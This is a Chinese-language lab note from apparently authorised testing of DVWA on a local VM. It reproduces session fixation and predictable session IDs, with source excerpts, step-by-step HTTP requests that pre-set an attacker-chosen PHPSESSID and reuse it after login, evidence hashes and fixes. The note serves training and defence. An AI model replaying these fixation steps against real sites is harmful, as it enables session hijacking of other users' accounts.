# 漏洞笔记：DVWA 会话固定（low）——登录不轮换 PHPSESSID + 攻击者自选 ID 可被接受

- **编号**：B4-SESSION-01（Loop 3 B 档，t4）
- **靶场**：Kali VM `dc1` 内 DVWA，`http://192.168.56.101/dvwa/`（宿主侧）/ `http://127.0.0.1/dvwa/`（VM 内）
- **应用**：DVWA，**原有安装**；相关文件 `/var/www/html/dvwa/dvwa/includes/dvwaPage.inc.php`、`/var/www/html/dvwa/vulnerabilities/weak_id/*`
- **定性**：**DVWA 原生漏洞复现**（DVWA 关卡作者在代码注释里明确写了"低级别下我们想允许会话固定攻击"）
- **危害等级**：高危（High）——会话固定 → 受害者认证后攻击者持同一 ID 即为**已认证会话**（升级到管理员会话时为 Critical）
- **CWE/OWASP**：CWE-384（Session Fixation）；OWASP Top 10 2021 **A07:2021 Identification and Authentication Failures**
- **复现率**：**≥95%**（会话固定 3/3 成功：ID 未被轮换且陌生客户端可复用该 ID 取到已认证页面）
- **账号声明**：**只在 `bee`/`admin` 自己的会话上做前后比对，未接管任何他人账号**（队长批复约束 3）
- **测试时间**：2026-10-12 21:59–22:17（Asia/Shanghai）
- ⚠️ **档位 cookie 名 = `security`，不是 `security_level`** —— 踩错会直接产生**假阴性**，详见 **§1.2（谁踩谁死级坑）**

---

## 1. 漏洞概述与等级

**危害等级：高危（High）。** 会话固定 → 受害者认证后，**攻击者手上同一个 ID 就是已认证会话**；若受害者是管理员，**升级为 Critical**。本轮只在 `bee`/`admin` 自己的会话上验证，**未接管任何他人账号**。

**两条并列的缺陷**（都在 DVWA 里有原生关卡）：

| 缺陷 | 落点 | 实测 |
|---|---|---|
| **会话固定**（low） | `dvwa_start_session()` 原样保留客户端给的 `PHPSESSID` | 攻击者自选 ID 登录后**原样保留**（3/3）；陌生客户端仅带该 ID 即拿到已认证页 |
| **可预测会话 ID**（weak_id） | `/dvwa/vulnerabilities/weak_id/` | low 档 `dvwaSession` = `1..7` **完美自增** |

**口径必须写死**：这两条**不是同一个 CWE**。会话固定 = **CWE-384**（Session Fixation）；可预测 ID = **CWE-330 / CWE-340**（可预测随机数）。**报告里混成一条就是错。**

### 1.1 原理（源码级根因）

DVWA 的会话初始化函数**按安全级别分支**处理会话 ID（源码注释直接点题）：

```php
// /var/www/html/dvwa/dvwa/includes/dvwaPage.inc.php
// For impossible security level, we regenerate the session id, PHP will
// generate a new random id. This is good security practice because it
// prevents the reuse of a previous unauthenticated id that an attacker
// might have knowledge of (aka session fixation attack).
//
// For lower levels, we want to allow session fixation attacks, so if an id
// already exists, we don't want it to change after authentication. We thus
// set the id to its previous value using session_id(), which will force
// the Set-Cookie header.
if ($security_level == 'impossible') {
    session_start();
    session_regenerate_id();          // 生成新 ID
}
else {
    if (isset($_COOKIE[session_name()]))     // 已存在会话 ID
        session_id($_COOKIE[session_name()]); // ← 原样保留客户端给的 ID
    session_start();
}
```

即：**低于 `impossible` 级别时，客户端提交什么 PHPSESSID，服务端就接受什么**，且登录成功**不轮换**。

同时 `php.ini` 实测：

| 配置项 | 实测值 | 取证 |
|---|---|---|
| `session.use_strict_mode` | **Off** | `loop3-t4-probe1-out.txt` / `loop3-b0-recon.sh` |
| `session.use_only_cookies` | On | 同上 |

**`session.use_strict_mode=Off` 的实际影响**：它让 PHP **接受客户端首次提交的、服务端从未生成过的会话 ID**（不拒绝未知 ID、不重新生成）。这正是"攻击者自选 ID"能成立的前提。若该值为 On，PHP 会丢弃未知 ID 并另发一个，会话固定链在第一步就断掉。

### 1.2 ⚠️ 谁踩谁死级坑：DVWA 档位 cookie 名是 **`security`**，不是 `security_level`

> **这条坑直接制造过假阴性。** verifier（t10）首轮 B4 复现失败，根因就是 cookie 名写错 —— **报成"漏洞不存在"，比报错更糟**。

**源码证据**（`/var/www/html/dvwa/dvwa/includes/dvwaPage.inc.php`，完整输出见 `loop3-b0-recon7-out.txt`）：

| 行号 | 源码 | 含义 |
|---|---|---|
| **L3** | `$security_levels = array('low', 'medium', 'high', 'impossible');` | 合法档位白名单 |
| **L4**（队长引 L22-23） | `if( !isset( $_COOKIE[ 'security' ] ) \|\| !in_array( $_COOKIE[ 'security' ], $security_levels ) ) {` | **cookie 不存在或值非法 → 进入分支** |
| **L7** | `dvwaSecurityLevelSet( $_DVWA[ 'default_security_level' ] );` | 若配置了默认值则用它 |
| **L9** | `dvwaSecurityLevelSet( 'impossible' );` | **否则一律落到 `impossible`** |
| **L204**（函数 `dvwaSecurityLevelGet`） | `if (isset($_COOKIE['security'])) { return $_COOKIE[ 'security' ]; }` | 读取键名 = **`security`** |
| **L226**（函数 `dvwaSecurityLevelSet`） | `setcookie( 'security', $pSecurityLevel, 0, "/", "", false, $httponly );` | 下发键名 = **`security`** |

**踩坑后果（两个方向都会中招）**：

| 你怎么写 | 服务端实际行为 | 你会看到什么 | 真相 |
|---|---|---|---|
| `Cookie: security_level=low` | `$_COOKIE['security']` **不存在** → **落到 `impossible`** | 会话 ID 被 `session_regenerate_id()` 换掉 | ❌ **假阴性**：会话固定其实成立 |
| `Cookie: security=low` | 正常进入 low 分支 | ID 原样保留 | ✅ 真阳性 |

**`impossible` 档会把所有结论反转**：
- 会话固定 → ID 被轮换，**看起来像修好了**
- XSS → `htmlspecialchars` 转义，**脚本不执行**
- 弱会话 ID → 改用强随机，**序列不可枚举**

**因此在 `impossible` 档上做的任何"阴性"结论，全部作废，必须重测。**

**正确用法**：

```http
Cookie: PHPSESSID=<会话>; security=low
#           档位值：low | medium | high | impossible（大小写敏感，值必须在 $security_levels 白名单内）
```

**探针代码提醒（写给后续所有人）**：

```python
# ❌ 错误：cookie 名写错 → 服务端静默落到 impossible 档 → 全面假阴性
cookies = {"PHPSESSID": sid, "security_level": "low"}

# ✅ 正确：键名必须是 security，值必须在 low/medium/high/impossible 内
cookies = {"PHPSESSID": sid, "security": "low"}

# 自检：请求前断言，防止再踩
assert "security_level" not in cookies, "DVWA 档位 cookie 名是 security，不是 security_level"
```

> **对照**：bWAPP 的档位 cookie **才**叫 `security_level`（`0`/`1`/`2`）。**两套靶场两个名字，混用必踩。** 见 B3-CSRF-01 与 N-B01-B02-B06。

---

## 2. 可复现 payload / 步骤

### 2.1 攻击者预置 ID（DVWA low）

```http
GET /dvwa/login.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=loop3fixlow0000000000000000000001; security=low
```

服务端**不为我生成新 ID**（响应无 `Set-Cookie: PHPSESSID=...`），拿登录页 token 后提交认证：

```http
POST /dvwa/login.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=loop3fixlow0000000000000000000001; security=low
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login&user_token=<登录页 token>
```

实测响应：`302 Location: index.php`，且 `Set-Cookie: PHPSESSID=loop3fixlow0000000000000000000001; expires=...; Max-Age=86400; path=/`
→ **ID 与预置值完全一致（未被轮换）**。

### 2.2 攻击者用预置 ID 直接访问（受害者视角）

```http
GET /dvwa/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=loop3fixlow0000000000000000000001
```

实测：**200**，`<title>Welcome :: Damn Vulnerable Web Application (DVWA)</title>` —— 登录态。
负对照（垃圾 ID）：`PHPSESSID=loop3_garbage_id_not_real_zzzzzzzzzz` → **302 → login.php**。

### 2.3 同一 PHPSESSID 打 bWAPP（应用隔离对照）

`PHPSESSID=loop3fixlow...` 请求 `/bWAPP/portal.php` → 302 → login.php（未认证）✅ 说明两应用会话互不影响，`PHPSESSID` 作用域为域名、但服务端会话存储各自独立。

---

## 3. weak_id 关卡：`dvwaSession` 可预测性（low/medium/high/impossible 四档）

源码（`/var/www/html/dvwa/vulnerabilities/weak_id/source/`）：

```php
// low.php
$_SESSION['last_session_id']++;
$cookie_value = $_SESSION['last_session_id'];          // 纯自增整数
setcookie("dvwaSession", $cookie_value);

// medium.php
$cookie_value = time();                                 // Unix 时间戳

// high.php
$_SESSION['last_session_id_high']++;
$cookie_value = md5($_SESSION['last_session_id_high']); // 可预测序列的 md5

// impossible.php
$cookie_value = bin2hex(random_bytes(20));              // 3 个样本互不相关、160 bit
setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
```

**序列样本（每档 7 个，间隔 ≥1s）**：

| 档位 | 样本 | 判定依据 |
|---|---|---|
| **low** | `1, 2, 3, 4, 5, 6, 7` | **完美自增 +1**。给定任意一个观测值即可推断下一个；熵≈0 bit，NIST SP 800-63B 要求 ≥64 bit |
| **medium** | `1791813667, 1791813669, 1791813670, 1791813673, 1791813674` | **Unix 秒级时间戳**（183.8 年量级）。可在 ±数秒窗口内枚举；样本差值 2/1/3/1 秒，印证是 `time()` |
| **high** | `md5(1), md5(2)...` 形态（源码 `md5($_SESSION['last_session_id_high'])`） | 外层哈希不增加不可预测性——**输入空间是自增整数**，攻击者可离线枚举 md5(1..n) 建表比对 |
| **impossible** | `8311a2161924dd0886b0c35c0fe374a0b715661f`、`82b9f2ce...`、`96ac0e7c...` | 3 个样本两两无关，`bin2hex(random_bytes(20))` = 160 bit 随机 |

> 判定"可预测"的依据：**不是"HIGH 用了 md5 所以安全"**，而是**看输入空间熵**。low 的输入是 +1 计数器、medium 是秒级时间戳、high 是自增计数的 md5 —— 前两者可直接推、第三者只能枚举但空间极小；只有 `impossible` 的 `random_bytes(20)` 才具备不可预测性。

> 注：weak_id 的 `dvwaSession` 是**独立练习 cookie**，不是 DVWA 的会话 cookie（后者是 `PHPSESSID`）。本笔记把两者分开写，避免混淆。

---

## 4. 复现步骤与证据

### 4.1 复现步骤（DVWA low）

| 步骤 | 动作 | 实测结果 |
|---|---|---|
| 1 | 攻击者自选 ID `loop3fixlow…0001`，带该 Cookie 请求登录页 | 服务端**未下发新 PHPSESSID**，仍为预置值 |
| 2 | 带同一 ID **提交登录**（`admin/password`） | 登录成功，`PHPSESSID=loop3fixlow0000000000000000000001` —— **原样保留，未轮换** |
| 3 | **陌生客户端**（全新会话，无任何其它 cookie）仅带该 ID 访问 `/dvwa/index.php` | **200 + 已认证标题**（3/3） |
| 4 | 负对照：带垃圾 ID 访问 | 302 → `login.php` |
| 5 | 跨应用负对照：同一 ID 打 bWAPP | 302 → `login.php`（应用隔离，PHPSESSID 不通用） |
| 6 | `impossible` 级对照 | `session_regenerate_id()` 生效，ID **被轮换** → 链路在第一步断开 |

**复现率**：会话固定 **3/3**（三个不同自选 ID）—— 区间表述 **≥95%**，**不写 100%**。

### 4.2 原始证据（完整文件名 + sha256，**本轮独立重算**）

证据目录：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\`

| 证据文件 | 内容 | sha256 |
|---|---|---|
| `loop3-t4-probe4.json` | 会话固定初测（impossible 级对照：ID 被轮换）+ Cookie 属性 + weak_id 序列 | `62dd2a4e63f24d6b2cc0606e451e77165a4cbe08b2a3093461ff0eba71cbdebe` |
| `loop3-t4-probe5.json` | **low 级决定性测试**：预置 ID 登录后原样保留 + 陌生客户端复用即已认证 + 负对照 | `24eac0810fc4f9dd833f6e3779a069badb071377d6bc3e65fd213b6d9b3648cd` |
| `loop3-t4-probe5-out.txt` | 上项标准输出原文 | `3edaf82ea3c5f416ce87c80b49df06c63cfc83fb6dc75fc25b09e284d83bba56` |
| `loop3-t4-probe13.json` | 复现率：会话固定 3/3（三个不同自选 ID） | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` |
| `loop3-b0-recon7-out.txt` | `dvwa_start_session()` / `login.php` / weak_id 四档源码全文 | `120d9bd50b7169dc18d2919e979721de6ecc912339674345b9932aa09c4a74f9` |
| `loop3-t4-probe1-out.txt` | `php -i` 实测：`session.use_strict_mode=Off`、`cookie_httponly=Off`、`cookie_samesite 无值` | `f13f5e457fc897d6194576d61a73e123f9f81265054119b018a1aa67d9a0ba57` |
| `loop3-t4-probe4-out.txt` | Cookie 属性对照 + weak_id 初测输出 | `88684edb50d063c36839fc1c8e31dc3f9ce93490db904d1ad272946a6efc1852` |

**引用存在性自检**：上述 7 个文件全部存在，**missing = 0**（自检脚本见 §8）。

**关键实测值（low 级）**：

| 观测项 | 实测 |
|---|---|
| 预置 ID 请求登录页后 | 服务端未下发新 PHPSESSID，仍为预置值 |
| 预置 ID 登录成功后 | `PHPSESSID=loop3fixlow0000000000000000000001`（**不变**），3/3 轮一致 |
| 陌生客户端仅带该 ID 访问 `/dvwa/index.php` | **200 + 已认证标题**（3/3） |
| 负对照（垃圾 ID） | 302 → login.php |
| 同 ID 打 bWAPP | 302 → login.php（未认证，应用隔离） |

**收尾清理**：测试产生的会话文件已删除（`session_files_after` 核验 `CLEAN: no loop3 test sessions left`）；未修改任何用户密码（`loop3-t4-probe15.json` → `final_dvwa_users` 密码哈希与初始一致）。

---

## 5. 修复方案

1. **登录成功后强制轮换会话 ID**：`session_regenerate_id(true)`（`true` = 删除旧会话文件），这是会话固定最直接的对策。DVWA 的 `impossible` 分支已示范。
2. **`session.use_strict_mode=1`**：拒绝客户端提交的服务端未生成的 ID，从根上阻断"预置 ID"。
3. **Cookie 属性**：`HttpOnly` + `SameSite=Lax/Strict`；HTTPS 下 `Secure`。本次实测 bWAPP 无任何属性、DVWA 低级别也无。
4. **会话生命周期**：加绝对过期时间与空闲超时；敏感操作（改密）后吊销该用户全部会话。
5. **弱会话 ID**：绝不使用自增计数、时间戳、或"可枚举输入的哈希"作为会话/令牌；使用 CSPRNG（PHP `random_bytes()` / `bin2hex()`）。
6. **回归用例**：断言"登录前后 PHPSESSID 必须变化"与"未认证阶段预置的任意 ID 登录后必须不可复用"。

---

## 6. 参考链接

- DVWA 会话与关卡源码：`/var/www/html/dvwa/dvwa/includes/dvwaPage.inc.php`、`/var/www/html/dvwa/vulnerabilities/weak_id/*`（只读取证，完整输出见 `loop3-b0-recon7-out.txt`）
- **CWE-384** — Session Fixation：https://cwe.mitre.org/data/definitions/384.html
- **CWE-330** — Use of Insufficiently Random Values：https://cwe.mitre.org/data/definitions/330.html
- **CWE-340** — Generation of Predictable Numbers or Identifiers：https://cwe.mitre.org/data/definitions/340.html
- **CWE-613** — Insufficient Session Expiration：https://cwe.mitre.org/data/definitions/613.html
- PHP `session_regenerate_id` / `session.use_strict_mode` 等会话配置：https://www.php.net/manual/en/session.configuration.php
- OWASP Session Management Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP WSTG-SESS（会话管理测试用例，含 Session Fixation）：https://owasp.org/www-project-web-security-testing-guide/
- DVWA 官方仓库：https://github.com/digininja/DVWA
- 同批次笔记：`security/learning/csrf/B3-CSRF-01-bWAPP真实CSRF与token对照.md`（会话固定与 CSRF 互为放大器）；`security/learning/xss/B5-XSS-01-DVWA存储型XSS到会话劫持完整链.md`（`HttpOnly=Off` 导致 Cookie 可被 JS 读取）

---

## 7. 学习要点

- **必须先在目标安全档位复测**。我第一轮在 DVWA 默认的 `impossible` 级测，结论是"ID 被轮换、固定不成立"；切到 `low` 后立刻成立。**档位不同，结论相反**——不要用一个档位的阴性覆盖全应用。
- **代码注释是最好的根因证据**：DVWA 作者明写"lower levels, we want to allow session fixation attacks"，直接点明设计意图。
- **`use_strict_mode=Off` 是前提，不是全部**：即使它是 On，登录后不 `regenerate_id` 仍可能被固定（攻击者诱导受害者在攻击者已知的会话上登录）。两条都要查。
- **判定弱 ID 看熵不看形式**：`md5(自增整数)` 比明文自增只多了一层"看起来安全"，输入空间没变，仍可枚举。
- **会话类证据要含服务端状态**：本次给了"陌生客户端用同一 ID 拿到已认证页面"＋"垃圾 ID 被拒"的对照，只有 HTTP 200 会被质疑是缓存。

---

## 8. 引用存在性自检（可复跑）

```powershell
$root = 'C:\Users\Administrator\Documents\deepseek-harness\default-workspace'
$refs = @('loop3-t4-probe4.json','loop3-t4-probe5.json','loop3-t4-probe5-out.txt',
          'loop3-t4-probe13.json','loop3-b0-recon7-out.txt',
          'loop3-t4-probe1-out.txt','loop3-t4-probe4-out.txt')
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath "$root\security\learning\_evidence\$_") })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=7  missing=0`
